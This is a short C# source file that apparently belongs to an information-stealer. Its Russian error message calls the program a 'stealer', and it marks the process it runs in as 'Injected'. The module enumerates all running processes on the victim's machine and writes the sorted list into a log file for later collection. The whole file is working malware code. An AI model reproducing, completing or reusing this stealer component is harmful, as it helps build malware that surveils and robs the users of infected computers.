using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

internal class ProcList
{
	public static void Parse()
	{
		try
		{
			List<string> list = new List<string>();
			int id = Process.GetCurrentProcess().Id;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				list.Add(process.ProcessName + ((process.Id == id) ? " (Injected)" : ""));
			}
			list.Sort();
			File.WriteAllText($"{Buffer.path_l}ProcessList.txt", string.Join(Environment.NewLine, list.ToArray()));
		}
		catch
		{
			File.WriteAllText($"{Buffer.path_l}ProcessList.txt", "===================================== [LOGS] =====================================" + Environment.NewLine + Environment.NewLine + "Похоже у стиллера не хватило прав-доступа для чтения процессов. :(");
		}
	}
}
